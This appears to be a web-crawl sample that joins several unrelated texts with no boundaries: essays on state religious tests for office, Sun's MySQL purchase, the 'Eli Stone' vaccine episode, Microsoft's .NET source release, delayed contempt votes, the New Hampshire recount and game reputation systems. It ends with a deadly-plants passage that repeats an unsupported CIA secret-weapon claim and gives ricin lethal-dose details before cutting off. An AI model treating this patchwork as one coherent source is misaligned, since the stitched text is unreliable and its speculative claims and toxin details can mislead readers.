Even the most attenuated bigotry is so disturbing that many of us will hope it fails on its own , and fade , rather than to tackle it directly and vanquish it .
Religious bigotry has perhaps a special place in American culture , going as far back as the founding of Massachusetts Bay Colony .
More than other prejudices , it retains considerable respectability in wide swathes of the public .
Hence a shocking 53 % of Americans say they would not cast a vote for president under any circumstances for an atheist .
It 's a mark of the resilience of religious prejudice that this standard of bigotry toward atheists , which had dropped in Gallup polls from 74 % to 48 % between 1959 and 1987 , has bounced back up a full 5 % since 1999 .
And this despite the fact that Article VI of the U.S. Constitution prohibits religious tests for office - holding .
Discrimination based upon creed , in general , remains acceptable in America to a shocking extent .
It comes as no news to me , who bears this pagan pseudonym , that I cannot aspire to elected public office .
And yet some information regarding religious discrimination , forwarded to me recently by Georgia10 , came as something of a surprise .
It turns out that eight states ( AR , MA , MD , NC , PA , SC , TN , and TX ) retain clauses in their constitutions that explicitly endorse or require discrimination based upon religious belief .
( Update : A commenter points out that Section 265 of the MS constitution also has a religious test - even though Section 18 states unequivocally " No religious test as a qualification for office shall be required " .
You could n't ask for clearer evidence than this of the urge to discriminate against non-believers ... )
Why were these clauses not amended and expunged long ago ?
A partial answer I suppose is that they are no longer legally enforceable .
In 1961 , SCOTUS ruled unanimously in Torcaso v. Watkins that the clauses in the Maryland constitution were invalid .
There were two articles at issue from the Maryland Declaration of Rights ( emphasis mine ) :
Art. 36 .
That as it is the duty of every man to worship
God in such manner as he thinks most acceptable to Him , all persons are equally entitled to protection in their religious liberty ; wherefore , no person ought by any law to be molested in his person or estate , on account of his religious persuasion , or profession , or for his religious practice , unless , under the color of religion , he shall disturb the good order , peace or safety of the State , or shall infringe the laws of morality , or injure others in their natural , civil or religious rights ; nor ought any person to be compelled to frequent , or maintain , or contribute , unless on contract , to maintain , any place of worship , or any ministry ; nor shall any person , otherwise competent , be deemed incompetent as a witness , or juror , on account of his religious belief ; provided , he believes in the existence of God , and that under His dispensation such person will be held morally accountable for his acts , and be rewarded or punished therefor either in this world or in the world to come .
Nothing shall prohibit or require the making reference to belief in , reliance upon , or invoking the aid of God or a Supreme Being in any governmental or public document , proceeding , activity , ceremony , school , institution , or place .
Nothing in this article shall constitute an establishment of religion ( amended by Chapter 558 , Acts of 1970 , ratified Nov. 3 , 1970 ) .
Art. 37 .
That no religious test ought ever to be required as a qualification for any office of profit or trust in this State , other than a declaration of belief in the existence of God ; nor shall the Legislature prescribe any other oath of office than the oath prescribed by this Constitution .
Roy Torcaso , whose appointment in MD as a Notary Public was blocked because he refused to declare his belief in God , took his case to the U.S. Supreme Court .
Its finding was that the Articles violate the 1st and 14th Amendments to the U.S. Constitution .
Justice Hugo Black wrote :
" There is , and can be , no dispute about the purpose or effect of the Maryland Declaration of Rights requirement before us - it sets up a religious test which ( it ) was designed to and , if valid , does bar every person who refuses to declare a belief in God from holding a public ' office of profit or trust ' in Maryland .
The power and authority of the State of Maryland thus is put on the side of one particular sort of believers - those who are willing to say they believe in ' the existence of God . '...
When our Constitution was adopted , the desire to put the people ' securely beyond the reach ' of religious test oaths brought about the inclusion in Article VI of that document of a provision that ' no religious Test shall ever be required as a Qualification to any Office or public Trust under the United States ' ..... "
Hence for nearly 50 years all eight states have been blocked from enforcing their constitutions ' religious tests .
There is no doubt about the established law in this area .
So why are these clauses still in existence ?
It ought to disturb you to see that Maryland Article 36 was amended in 1970 , but without removing the unconstitutional language on religious tests .
What in the world is that state waiting for , an engraved tablet from Mt. Sinai inviting them to put religious discrimination in the past ?
Or consider Art. VI , Sect. 2 of the 2006 South Carolina Constitution :
No person who denies the existence of the Supreme Being shall hold any office under this Constitution .
Last amended in 2006 , and yet this flagrantly unconstitutional provision remains in place .
This despite the fact that the South Carolina Supreme Court ruled in 1997 that the clause violates the U.S. Constitution .
This was a case brought in 1993 after Herb Silverman 's application to become a Notary Public was denied because he had crossed out the word " God " on the form .
The same can be said of the religious tests of Texas , overturned in O'Hair v. Hill ( 1978 - 84 ) , and of North Carolina , overturned in Voswinkel v. Hunt ( 1979 ) .
Both constitutions retain their unconstitutional clauses to this day .
So in point of fact , these state religious tests are both vestiges of an earlier era , as well as living tokens of religious bigotry .
There is no guarantee that , as long as they survive , the states will never again attempt to enforce them .
The failure to eliminate provisions that are both unconstitutional and an affront to civil society reflects , at a minimum , a mindset that holds a significant segment of the public in disregard .
On the whole , these clauses present an ugly picture .
Some , like the religious tests of Texas and Pennsylvania , play coy by protecting the rights of believers but not of non-believers :
No person who acknowledges the being of a God and a future state of rewards and punishments shall , on account of his religious sentiments , be disqualified to hold any office or place of trust or profit under this Commonwealth .
But several of these unrepentant religious tests boldly deny rights to non-believers , such as the constitution of Arkansas :
No person who denies the being of a God shall hold any office in the civil departments of this State , nor be competent to testify as a witness in any Court .
I can testify to one fact , that this clause is repulsive and should have been expunged by the good people of Arkansas long ago .
BERKELEY , Calif. ( MarketWatch ) -- Sun Microsystems Inc. gobbling up MySQL is perhaps the worst single event I have ever witnessed in the history of tech mergers and acquisitions .
The move , announced earlier this week , is potentially a disaster for the entire sector for reasons I 'll outline here .
Let 's begin by putting MySQL in perspective :
It 's the most competitive and biggest threat to Oracle Corp. , if for no other reason than it 's cheaper , and in many applications , more practical .
It 's used extensively by the open - source community and is the engine that runs almost all the blogging software -- including the successful WordPress , which is used as the blogging - content back end for the New York Times , among other large commercial enterprises .
Google Inc. GOOG , +0.32 % and Yahoo Inc. YHOO use MySQL .
Now Sun JAVA has wrested control of this important piece of code .
Horrible track record
Sun has an awful track record with its acquisitions .
Here is a recent official list .
( Aside : What is that Mao- inspired picture of Jonathan Schwartz all about ? )
What became of any of these purchases ?
I should mention that this official list is hardly the entire list .
“ I 'm close to being convinced that Oracle wanted to buy MySQL to kill the product , but knew it could n't pull off the stunt itself .
So it sent in a stooge to do the job . ”
Sun 's crummy results go way back and include unique and useful products such as TOPS -- a PC to Mac file - sharing OS , which was bought by Sun in 1987 , then rotted from neglect .
For more recent botches , read an analysis of Sun 's miserable track record on storage - company acquisitions here .
From another perspective , you have to wonder why MySQL was sold in the first place and who orchestrated this deal .
If anyone actually knew that MySQL was up for grabs , I expect that Google , Yahoo and certainly Microsoft Corp.
MSFT , - 1.04 % would have been interested , and there should have been a publicized bidding war resulting in a much higher price than $ 1 billion .
Part of this silence stems directly from the fact that MySQL is a Swedish company , and heaven forbid the Swedes announce their intentions or do anything that would appear flamboyant or be interpreted as ( gasp ) bragging !
Puppetmaster Oracle
So who is the real beneficiary of this deal ?
MySQL is a genuine nuisance to Oracle ORCL , - 0.18 % .
I 'm close to being convinced that Oracle wanted to buy MySQL to kill the product , but knew that it could n't pull off the stunt itself .
It would be too obvious , especially to European Union regulators .
So it sent in a stooge to do the job .
The two companies , Sun and Oracle , have been strategic partners for years .
On top of that , Sun cannot actually afford to spend a $ 1 billion on a company producing a mere $ 60 million in revenue and working outside its core competencies .
So who can afford it ?
Oracle , that 's who .
This deal stinks from top to bottom .
The only good news is that since MySQL is an open - source initiative , an immediate development fork will occur with a new open - source relational database appearing within a year or two , based on aspects of the original code .
The original MySQL will simply vanish over time , along with Sun 's billion .
Exactly how painful this transition will be for current users of MySQL remains to be seen .
As far as anything good happening from the Sun acquisition , I do n't see it , except for the shareholders of Oracle .
Nice job , Larry .
UNDER pressure from the American Academy of Pediatricians , ABC tonight will include an extraordinary disclaimer on the first episode of its new series “ Eli Stone ” – reminding viewers that everything in the lawyer drama , which depicts real - life issues , is just fiction .
Why the unusual disclaimer ?
Because the show perpetuates an insidious myth – namely , that childhood vaccines are a cause of autism .
At issue in the episode is whether the thimerosal preservative formerly used in vaccines causes autism .
A jury in the show concludes the opposite of what just about everyone in the real world should now know : that the supposed vaccine - autism link is based on discredited studies and wacky activist assertions .
On the face of it , ABC ’s disclaimer that the show is fiction seems unnecessary .
Who ’d really think a prime - time drama is a documentary ?
Problem is , popular media and celebrities hold great sway over public opinion .
A new report released by my organization , the American Council on Science and Health , notes that celebrities are making all sorts of mistaken assertions about public - health matters .
Whether it ’s Sheryl Crow making a flap about the “ danger ” of heated plastic or Tom Cruise railing against the notion of mental illness , our scientists concluded the stars were wrong – but the public is listening to its idols .
It ’s clear that celebrities , both as outspoken public figures and on TV shows , have a funny way of getting us to believe them – despite their absolute lack of expertise .
Indeed , their actual expertise , like the expertise of the “ Eli Stone ” producers , lies in getting us to believe their fiction .
So it took an almost unprecedented move to get ABC to remind viewers that “ Eli Stone ” is just fiction .
The pediatricians ’ association had actually called on ABC and its child - friendly parent , the Walt Disney Co. , to cancel the episode .
Of course , no group has any legal power to censor what we see on TV .
But the call for ABC to voluntarily cancel the show encouraged the network to take some much - needed responsibility .
How outrageous is the episode ?
Consider how rare it is that a large group of physicians actually has the courage to take a stand like this – to risk coming off as censors .
When else has such a large , mainstream group been able to reach a consensus and speak out against unscientific nonsense this way ?
We should applaud the pediatricians ’ move and encourage other serious science - oriented groups to take similar approaches in combating junk science .
Oh , and about “ Eli Stone , ” a crusading lawyer who has “ visions ” about how he can improve the world :
Let ’s keep a cautious eye on that show , while it lasts .

I read on Scott Guthrie 's blog the news that Microsoft will release the source code to the class libraries that make up .
NET :
Today I 'm excited to announce that we 'll be providing this with the .NET 3.5 and VS 2008 release later this year .
We 'll begin by offering the source code ( with source file comments included ) for the .NET Base Class Libraries ( System , System .
IO , System .
Collections , System .
Configuration , System .
Threading , System .
Net , System .
Security , System .
Runtime , System .
Text , etc ) , ASP.NET ( System . Web ) , Windows Forms ( System. Windows .
Forms ) , ADO.NET ( System.Data ) , XML ( System.Xml ) , and WPF ( System . Windows ) .
We 'll then be adding more libraries in the months ahead ( including WCF , Workflow , and LINQ ) .
The source code is released under a new license they are calling the Microsoft Reference License , this is not an open source license .
First of all , congratulations to everyone at Microsoft that made this happen .
Am sure many .NET developers will be happy with this new development and there will be many genuine uses for this .
I heard a podcast with Shawn Burke where he discussed some of the history of behind this move .
The discussion seemed mostly tactical , and am sure that to do this they must have presented a strong business case to their management that opening up the access to the source code ( even under the MS Reference License terms ) was important .
Even if the license for the code is not open source , it is an important step .
Sun had done something similar with Java in the past and over time they moved towards opening more and more of it .
Am still hope that one day Microsoft will open pieces of this under more liberal licenses that would allow those pieces to be used for any purposes , including Mono .
Mono , free software and the source code release
The source code that will be released goes beyond the scope of the C# source code that was released as part of Microsoft Rotor .
But like Rotor , the license under which this code is released is not open - source .
People that are interested in continuing to contribute to Mono , or that are considering contributing to Mono 's open source implementation of those class libraries should not look at this upcoming source code release .
At the same time , Microsoft already releases some class libraries under an open source license , the Microsoft Permissive License ( MS - PL , which will soon be renamed the Microsoft Open License ) .
Mono manages to benefit from code that Microsoft releases under the MS - PL license and we even redistribute some of it : The Dynamic Language Runtime , IronPython , IronRuby and the ASP .
NET AJAX Javascript client - side library .
Speculation
Am not sure why Microsoft did this , there have been a few theories around this , but my own guesses are :
Scott and many people reporting to him understand developers ( Scott did ASP.NET ) .
Scott being in charge of .NET probably has made this organization be more Web-y , in that they understand that developers are more effective if they can " View Source " .
So it might be a natural cultural shift .
Scott and his team are behind the Microsoft / Novell collaboration on Silverlight for instance .
Scott and his team are behind the Microsoft / Novell collaboration on Silverlight for instance .
Large .NET users probably already had access to the source code , and probably had access to under a myriad of customer - specific NDAs or licenses and this was hard to work with , and hard for the organization to manage .
This could be license consolidation and streamlining of the process to get people access to the source code .
Getting access to the source code alone was probably very cumbersome .
This is probably why the focus of the release is on the simplicity of getting the source code for debugging ( the most important scenario presented so far ) .
Sun and Java : it is possible that some customers were getting cozy with the ease of access to Java source code to the class libraries and this had some mounting pressure on Microsoft .
Some of the statements are very similar to what Sun used to make about Java before they agreed to open source it :
Allowing developers to rebuild a framework , any framework , from source , and then redistribute the modified result , can introduce problems with providing support , serviceability , integrity and security of the framework itself .
This is true with .
NET , Java , Ruby , and other frameworks .
Multiple independent redistributed modified versions of a framework can decrease the reliability and dependability of the common platform , which is not desirable .
In the path we 've taken here , we are seeking to balance the requirements we hear from the developer community for transparency and of reliability and dependability of the platform .
In striking that balance , we believe the Microsoft Reference License is the right license for this release .
There are a number of scenarios that go beyond looking at the source code which are think are valuable in the existing Microsoft ecosystem and which is ultimately why it would be useful for some chunks to become open source .
For example :
Bugs in Class Libraries :
If there are bugs in the class libraries that can not be worked around , the user does not have to ship a replacement System.dll , but he could copy - paste the code , make the adjustments in the code and ship the resulting executable .

Different Needs :
If the code is close , but not quite what he needs , a developer could cut - and - paste , and then tune the code to do what he needs .
This is a very common case that we see with Mono 's own source code .

Complement Existing Frameworks : Microsoft ships a number of reduced versions of .
NET : Compact Framework and Silverlight 1.1 .
People often need features that are only available on the full framework .
Many folks today cut - and - paste code from Mono to be used on the Compact Framework edition because the subset that Microsoft chose for the CF is a good starting point , but it does not fit all the needs , specially in a market that is heavily slanted towards embedded systems ( our XML Serializer is one of the most cut and pasted pieces of code for example ) .

Supporting old Frameworks :
With 3.5 coming out it is very likely that some features would be useful for applications that must run with 1.1 or 2.0 on systems that can not be upgraded to 3.5 .
Cut and pasting code would be useful .

Innovation : Although people can always innovate on " top " of an API , some kinds of new features can only be done if you can alter the inner workings of it .
Certainly Microsoft has the right to not let people do that .
For the above cases , people today can continue to use the Mono source code and cut and paste at will ( with our super - liberal license the MIT X11 that comes with no strings attached ) .
But I still believe that there is a good business case for opening more stuff under the more liberal MS - PL license .
And of course , beyond the Microsoft ecosystem , there is the Mono ecosystem , where we could leverage that code if it were open source :-) .
House Democrats will postpone votes on criminal contempt citations against White House chief of staff Joshua Bolten and former White House counsel Harriet Miers , while congressional leaders work with President Bush on a bipartisan stimulus package to fend off an economic downturn , according to party leaders and leadership aides .
Senior Democrats have decided that holding a controversial vote on the contempt citations , which have already been approved by the House Judiciary Committee as part of its investigation into the firing of nine U.S. attorneys , would “ step on their message ” of bipartisan unity in the midst of the stimulus package talks .
“ Right now , we ’re focused on working in a bipartisan fashion on [ the ] stimulus , ” said House Majority Leader Steny H. Hoyer ( D - Md. ) , indicating that the contempt vote is not expected for weeks , depending on how quickly the stimulus package moves .
Brendan Daly , a spokesman for House Speaker Nancy Pelosi ( D - Calif. ) , said “ no decision has been made ” as to when a criminal contempt vote would be held by the House .
The Congress is too busy giving away money to people they hope to have vote for them ( not that it 's wrong , but some long - term regulatory and policy shifts instead of handouts would be nice ) to bother themselves with the rule of law It 's enough of a struggle to get Congress to walk , you do n't expect them to chew gum at the same time , do you ?
These citations were originally approved in the Judiciary Committee LAST JULY , by the way .
They will NEVER be voted upon , I think that much is clear .
There will always be an excuse .
And there will always be Blue Dogs unwilling to " look weak " by doing something strong .
Democratic aides admit they do n't even have the votes in the House to protect their own oversight responsibilities .
And so a President will have set the precedent of extending executive privilege even further , and Congress will become even more irrelevant .
I liked it better when they were out of session , it was much easier on my stomach .
Labels : Congress , executive privilege , Harriet Miers , Josh Bolten , Nancy Pelosi , separation of powers , Steny Hoyer , subpoenas
I 've spent the better part of two days looking over numbers on web pages and spreadsheets , monitoring bulletin boards , sending out e-mails , and making calls , all in the name of sorting out what , if anything , went wrong with New Hampshire 's presidential primary .
Before I get into any kind of detailed discussion of the NH primary vote , I 'll skip to the punchline and tell you the two conclusions that I 've come to at this point :
Nobody really knows whether anything actually went wrong with New Hampshire 's presidential primary , either on the Republican side or on the Democratic side .
The proposed recount may not truly end the dispute , or the underlying uncertainty .
Let me take these two conclusions one at a time , and explain how I 've arrived at them .
Along the way , I 'll also try to draw some lessons about what NH might tell us about the November presidential contest .
Fearful symmetry : the hand count versus machine count discrepancies
On the day after the New Hampshire primary , Bruce O'Dell from the Election Defense Alliance posted the following startling vote tallies , which showed that Clinton 's and Obama 's percentages of the hand - versus machine - counted tallies were mirror images of each other — out to five decimal places .
Clinton Optical scan 91,717 52.95 %
Obama Optical scan 81,495 47.05 % Clinton Hand- counted 20,889 47.05 %
Obama Hand- counted 23,509 52.95 %
These numbers flew across the Internet , and for those who suspected election fraud , the table above was a smoking gun .
Except that it was n't a smoking gun — it was more like a temporary shape in the clouds that , for a brief moment , looked exactly like a smoking gun .
When I first saw those numbers my initial reaction was that they were fishy ; and not fishy in the " Clinton really did steal the election " sense , but in the " something 's wrong with the source data here " sense .
I wracked my brain for possible fraud - related explanations , but ultimately I just could n't conceive of an election theft situation that would result in a symmetry like this .
I mean , no fraudster would deliberately do something as bizarre as reverse the hand - count and machine - count percentages like that .
It made no sense .
After grabbing a copy of O'Dell 's spreadsheet and hitting the NH Secretary of State 's web site to compare and crunch the numbers myself , I soon discovered that there were two major problems with O'Dell 's vote totals and with the remarkable symmetrical percentages that they produced .
( Note that I was not alone in these conclusions ; there were a few people in one of the forum threads I was monitoring who were asking the same questions . )
First , I spotted a number of districts that the spreadsheet incorrectly listed as " hand - count " districts , but that the NH Secretary of State 's web site listed as machine - count districts .
As it turns out , fourteen districts were incorrectly identified as hand - counted in O'Dell 's source .
So moving those fourteen counties from the " hand count " into the " machine count " column made the symmetry disappear .
It also made the discrepancy between the hand count and machine count even wider , but more on that later .
The second thing wrong with the table above is that the numbers on which it was based were preliminary , and were still being updated on the Secretary of State web site .
The updated vote tallies , which I accessed and compared to O'Dell 's spreadsheet , also destroyed the symmetry of the percentages .
( O'Dell issued an update to the numbers Monday evening .
So if you 're someone who has been passing around the table above via e-mail or the Web , please pass this update along as well . )
The steady trickle of updates to the Secretary of State web site had another effect this story ( besides removing the smoking gun ) as I watched it rapidly develop at Internet speed .
Spreadsheets and lists with different vote tallies , all of which came from the NH web site at different times , were flying through the tubes , with each set of numbers sprouting statistical and political analyses of varying degrees of detail and sanity .
So if you 've spent any portion of the past few days looking at different breakdowns of the hand versus machine counts for Obama and Clinton on different web sites and wondering which one is right , the answer is that they all are ... or maybe none of them are .
I stopped trying to figure out why this person 's differed from that person 's at about 7 PM Monday evening .
If you 're interested in seeing the very latest number crunching , then check out any of the following links :
The consensus from the above links is that when you control for town size and a few other factors , vote - counting method ( Diebold or hand ) still correlates with the outcome ( Clinton or Obama ) to a non-trivial degree .
The remaining question is whether there 's some still unknown demographic variable that accounts for the correlation between a district 's vote counting method and who came out ahead there , or whether monkey business was involved .
I personally am leaning toward demographics as the final explanation , for various reasons that , in the end , are so vague as to not be worth going into here .
Lessons from the numbers
I want to draw a few general lessons from the story of the symmetrical percentages , and specifically from the amount of attention that these percentages got from traditional press outlets , blogs , and online news sources .
Lesson 1 : The Internet is full of people who have four things that make them dangerous , both to would - be election fraudsters and ( paradoxically ) to the larger cause of election integrity : computers , intermediate math skills , a mix of patriotic and entrepreneurial zeal , and the ability to publish in the blink of an eye .
When you add a stream of evolving vote tallies to this mix and shake vigorously , the resulting concoction will produce lots and lots of foam .
( Some of that foam may look just like the Virgin Mary for a bit , so you can get on the evening news with it if you 're quick enough .
But I 'm getting ahead of myself . )

Lesson 2 : The larger the cloud of numbers and statistical analyses grows , the less inclined reporters will be to actually download a spreadsheet and tackle the data themselves .
They 're just going to report what this or that group has uncovered , especially if it 's juicy .
: The larger the cloud of numbers and statistical analyses grows , the less inclined reporters will be to actually download a spreadsheet and tackle the data themselves .

Lesson 3 : The e-voting activism world is an odd mix of patriotism , territorialism , and old - fashioned entrepreneurism .
Basically , everyone is racing to find that remarkable scoop that 's going to get them quoted on CNN .
So before the polls even close , there are all of these folks furiously sifting through the mix of testimony , rumor , data , background , reporting , and analysis that swirls about in the wake of a close election .
With all of that energy and all of those numbers flying about in the ether , someone at some point is going to spot a compelling pattern that looks like the work of an intelligent designer .
The odds of someone finding such a pattern probably increases with the volume of data and the number of eyeballs .
And the person that finds that pattern may get a ton of press attention , for better ( in the case of real fraud ) or for worse ( in the case of a wild goose chase ) .
My ultimate point with the lessons above is this —
New Hampshire is a pretty small state ; take what I 've just described , imagine it on a national level , and you 'll get a glimpse of what it will be like for me to cover the e-voting beat in November .
Chain of custody : what , exactly , are they ( re ) counting ?
Now , for the reasoning behind my conclusion that the announced recount ( courtesy of not of Ron Paul , but of the equally loopy Kucinich and crew ) may not settle this .
Most of the questions that will be raised about the results of today 's recount ( see below for time and place ) will have to do with chain of custody issues .
For the recount to be reliable , a chain of custody must be established for all of the ballots involved .
This means that each ballot must have been either under lock and key or under the watchful eye of a known and trusted list of state officials for every moment of its post-election life .
If any point a group of ballots were left unattended , or if it 's impossible to list exactly who could 've had access to them , then establishing a secure chain of custody for those ballots will be impossible .
In the absence of a secure chain of custody , it 's possible that someone could have replaced some of the ballots with counterfeits , or that they could have tried to alter them in some way .
That 's why establishing such a chain of custody is important — at least , it 's important in theory .
What will almost certainly happen in practice is that no one will be able to establish a secure chain of custody for every ballot cast in New Hampshire , but that wo n't stop the press from reporting the results of the recount as if they 're 100 percent reliable .
And they may well be reliable ; in fact , they probably are .
But absent a secure chain of custody , no one can know for sure .
The other thing that 's critical to a proper recount is that it be undertaken in full public view .
Public recounts do n't always happen , but they should .
There was a great scene from the HBO documentary Hacking Democracy in which e-voting activist Bev Harris confronted Cuyahoga County election officials over those officials ' insistence on carrying out a recount of Ohio 's 2004 presidential election in secret .
Two of those officials were sentenced last March to 18 months in jail for rigging that recount 's results to match the official tally , and the judge in the case said that he suspected that the recount rigging went beyond just those two employees .
My aim in bringing up Ohio is not so that we can all refight the 2004 election , though I 'm sure that will happen in the discussion thread , since the mere mention of Ohio sends some of our forum denizens into apoplectic fits .
Rather , I want to point out that election officials can have an extraordinarily strong incentive to prove that the election that they just oversaw was fair and to ensure that the recount bear out the quality of their stewardship of the vote .
Otherwise , if the recount overturns the official tally , then there will be investigations and recriminations , and heads will roll .
This is why voters must insist that recounts be carried out in public , under the gaze of representatives of all the interested parties .
Thankfully , it looks like the NH recount is on the right track in the transparency department .
The forum post quoted below ( from the BBV thread linked previously ) gives details of today 's recount , including the time and the place :
Okay , I just got off the phone with the Sec'y of State 's office ; ALL ballots , from EVERY jurisdiction in New Hampshire , are being trucked to Concord for the recount .
That means EVERY SINGLE BALLOT CAST will be recounted , and the PAPER ballots from the Diebold districts will be counted ( as opposed to simply recounting the machine totals ) .
The recount will commence at approx .
900 am [ today ] , at the Archives Building in Concord , located at 71 South Fruit St. Anyone in the public is welcome to come , so I suggest anyone checking in here please go down and monitor the process closely .
The campaigns are allowed to name particular monitors ( I imagine they get a position close enough to read the tick marks on the ballots , whereas the public just watches the process from a gallery ) .
I 'm going to notify the campaigns as best I can , but if any readers know people from inside the campaigns , please notify them and have them contact the Secretary of State 's office to insure access .
Let 's hope that with respect to completeness and transparency ( if not chain of custody ) , today 's New Hampshire recount will serve as a model for any future recounts that may take place this election season .
Conclusions : thirty - four potential headaches
As of today , only sixteen states mandate both a voter - verified paper trail ( VVPT ) and a random manual audit of election results .
The remaining 34 either do n't have a mandatory VVPT , do n't have mandatory audits , or do n't have either .
So that 's 34 possibilities for a close presidential contest to produce the same blizzard of data , analysis , accusation , and uncertainty that we saw on a very small scale with New Hampshire .
Let 's hope for a blow - out , landslide victory by one side , because I get tired just thinking about anything closer .
For some reason Fable and KOTOR 's reputation systems keep coming up among my group of friends .
I personally think those were an interesting try , but ultimately unsuccessful .
The problem I have with them is that they come really close , but every once in a while the good / evil system kind of . . . breaks down .
The best example I have is with the beginning of Fable .
My friend was playing at the time .
There 's a wife who tells you to go find her husband .
If you find him then come back to tell her where he is , she 'll give you a coin .
Yay .
So you go find him , and he 's making out with another girl .
He says if you do n't tell anyone , he 'll give you a coin .
Now , first off , the game is making the assumption that the husband is the bad guy .
Second , the game is making the assumption that the husband does n't deserve his privacy , because he 's being the bad guy .
I 'd argue with both of those ( or , at least , argue with it being an obvious assumption ) , but that 's a moral position .
The big issue is that the game assumes your actions are motivated by the results for the participants , and not for cold hard cash .
Well , my friend wanted the cash .
So he promised he would n't tell the wife , and got a coin , and then promptly went and ratted the guy out , and got another coin .
Amusingly , grabbing the first coin caused him to become more evil , but the second caused him to become more good – despite the fact that he was playing " I do n't care who I hurt , I just want cashola " .
The developer can't solve this problem .
The only possible " solution " is to quiz the player , at every step , on why they 're doing the thing that they 're currently doing .
And , as entertaining as the idea is , that 's not really a solution .
The best fix to this is convenient , because it 's actually practical , more realistic , and more interesting .
Reputation should n't be a global number .
It 's not a single axis , where priests love you on one side and Hitler loves you on the other .
Reputation is a personal thing and a group thing , but not a global thing .
Luckily computers are now powerful enough that we can manage this without much trouble at all .
What should have happened is surprisingly simple .
Let 's assume , for the sake of argument , that the husband is a jerk and that the wife is really in the right .
You promise the wife that you 'll help her out , and she thinks slightly more of you .
You promise the husband that you 'll keep his secret , and he thinks a lot more of you .
Now you go back and rat him out , the wife thinks a lot more of you ( I presume you do n't mention " oh yeah I took his money first ) , but once he finds out – well , the husband hates you .
Now add in communication .
The husband probably talks to his friends .
He might mention " that kid who ratted me out , after taking my money ! "
Now they wo n't like you as much .
Now , the husband 's friends are probably a bunch of lowlifes , since like attracts like .
So now you 've got all the scum disliking you .
No problem here , right ?
The wife is thankful that you helped out .
She 'll probably mention that to her friends .
So now her friends like you a bit ( and , incidentally , like the husband quite a lot less – we may as well be thorough here ) .
No problem here either .
But when the two groups meet up and compare notes , if they in fact ever do , they might realize that , okay , so you did tell the truth – but you 're also not to be trusted .
And neither of them are going to appreciate that – the wife 's side , or the husband 's side .
There 's the proper penalty , and it 's simply not a single axis .
This is n't even particularly hard to orchestrate .
You can simulate it pretty easily by sending " knowledge packets " between characters .
Husband knows " kid can not be trusted " , and that knowledge has a chance of duplicating itself every time someone with it interacts with someone else .
Wife knows " kid helped me out " , and that also has a chance of duplicating on each interaction .
Give both of those infopackets some effect on how people think of you ( " cannot be trusted " might actually be a good thing in some circles ! ) and then add in some broad strokes of who - talks - to - who – which can be very simple and vague , to the point of " people in this village tend to talk to each other and people tend to talk to their spouses " and still be effective – and you 've got a system where things like that actually can hurt you later on .
Throw in a few ways to assemble text and you 're golden .
Player talks to NPC , asks for favor , NPC checks its databases and sees it does n't like player .
Why not ?
Randomly pick one of its reasons , weighted based on importance .
" Well , I 'd like to help you out , but I heard about {what you did to Jeffrey off in Smalltown} . . . and I just do n't think I can trust you , can I ? "
And remember , " kid ca n't be trusted " might endear you to some certain groups .
You might have honorable thieves , sure , but it 's entirely possible you could have dishonorable thieves too , who slap you on the back and buy you a drink if you tell the story of How I Got Two Coins Instead Of Just One ( right before spiking your drink and stealing your wallet . )
You can code this into them without too much trouble – just set it up so that " this person is low on trustworthiness to me " is a good thing .
I imagine you 'd have several major axes of opinion – " trustworthiness " , " helpfulness " , " power " – and certain people could easily react differently to each axis .
In fact there 's probably a fascinating research paper to figure out what major axes people actually think of each other on – in real life , the phrase " he's a nice guy , but he 's just not very bright " shows up quite often , and that 's just a simple example .
Is that cool ?
I think it 's cool .
And it neatly avoids trying to divide every action into " good " and " evil " – your actions will be important , not based on the nature of the action , but based on how the characters around you regard that action .
Three Deadly Plants within 150 paces of my Front Door
Florida is literally crawling with non-native species .
In addition to the invasive animals and insects , which threaten our fragile ecosystems , a great many introduced plants have taken root in this favorable climate .
Some , we find beneficial , some invasive , while others are downright deadly .
The plants featured here are a little bit of all three .
All are in my neighborhood as a result of their long relationship with humans .
Each has been cultivated over centuries , and was brought here for it ’s usefulness , ranging from landscape ornamental to source of oil , to cattle fodder , to herbal remedy , to jewelry .
They have laid claim to a great deal of American soil , and there ’s a good chance that you may find one of them near your home , too .
Although I have not researched beyond the U.S. , I am quite certain that this holds true to many other countries , as well .
My interest in deadly plants was sparked when I watched a video of a retired FBI agent who mentioned that the CIA uses an undetectable secret weapon , which mimics the symptoms of a heart attack and kills almost instantly .
The interesting part was that this plant can be found almost anywhere and is a favorite of terrorists and rogue nations , as well as an alleged CIA assassination tool .
Fascinated , I searched the internet for more information .
Lo and behold , I instantly recognized this plant as one that I can see from my window !
The bean of this plant is the source of both the infamous castor oil ( known for it ’s foul taste and curative properties ) as well as the deadly toxin ricin .
My curiosity spurred , I searched further and turned up numerous toxic plants growing in my yard and the neighboring landscapes .
For this article I will focus on the three most deadly , in no particular order .
1. THE CASTOR BEAN PLANT
Latin Name : Ricinus communis L .
Distance from my Door : 75 paces ( 151 feet )
Origin : Northeastern Africa and the Middle East .
USDA Plants Profile and Distribution Map
When Castor Beans are ingested , poisoning is caused by the powerful cytotoxin ricin , which gets inside a person ’s cells and prevents them from making necessary proteins .
When injected , a hemagglutinin called ricinus communis agglutinin ( RCA ) causes the red blood cells to burst .
Toxicity
The Center for Defense Information website states that “ Ricin is the third most toxic substance known after plutonium and botulism ” .
It has been estimated that it would take 6,000 grams of cyanide or 12,000 grams of rattlesnake venom to equal one gram of ricin .
A dose of ricin somewhere between the size of a grain of table salt and a pinhead is enough to kill a grown man .
Eating one bean can kill a child , and as few as four beans can kill and adult .
There is neither vaccine nor antidote for ricin or RCA poisoning .
Victims are admitted to the hospital and treated for the symptoms .
If you have not died within three to five days of exposure , you will probably survive .
Signs and symptoms of ricin exposure
A variety of symptoms may result , depending upon the dose received and the route of exposure .
In severe cases many organs may be affected .
Symptoms of inhalation typically occur within 8 hours and may include fever , cough , tightness in the chest and respiratory distress , followed by heavy sweating , fluid buildup in the lungs low blood pressure and respiratory failure .
Ingesting significant amounts of ricin can cause nausea , vomiting , diarrhea , severe dehydration , low blood pressure and multiple organ failure .
Poisoning via injection causes lymph node failure followed by failure of the liver , kidneys and spleen .
Next , the stomach and intestines hemorrhage , resulting in death from multiple organ failure .
Despite the dangerous nature of the Castor Bean , it is used in a variety of products .
The infamous “ Castor Oil ” is known for its medicinal properties and foul taste .
The beans are also used for livestock feed and explosives , just to name a few .
Castor meal contains 40 % protein and is made safe for animal consumption by removing the toxins via a process called “ hot water extraction ” .
Ricin Assassination
In a true event , straight out of a James Bond movie , Georgi Markov , a Bulgarian writer and BBC journalist , was assassinated in 1978 by a man yielding an umbrella .
